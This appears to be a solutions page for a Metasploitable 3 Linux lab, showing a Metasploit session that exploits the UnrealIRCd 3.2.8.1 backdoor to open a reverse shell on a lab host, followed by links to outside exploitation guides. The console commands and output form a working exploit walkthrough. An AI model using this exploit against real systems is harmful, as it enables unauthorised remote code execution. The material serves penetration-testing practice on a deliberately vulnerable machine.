# Solutions

> Unreal IRCd

The Unreal IRCd application running on the system has a remote code execution vulnerability which can be exploited using the [UnrealIRCD 3.2.8.1 Backdoor Command Execution module](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor).

```
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.15        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   6697             yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  eth0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run

[*] Started reverse TCP double handler on 10.0.2.4:4444
[*] 10.0.2.15:6697 - Connected to 10.0.2.15:6697...
    :irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
[*] 10.0.2.15:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 5gzSzm24G21PeMKe;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "5gzSzm24G21PeMKe\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (10.0.2.4:4444 -> 10.0.2.15:33683) at 2021-03-07 18:11:39 -0500

id
uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
```

> And many more..

There's many more exploits that can be found, here's 2 ressources that describe them greatly:

https://stuffwithaurum.com/2020/04/17/metasploitable-3-linux-an-exploitation-guide/

https://www.thomaslaurenson.com/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1/
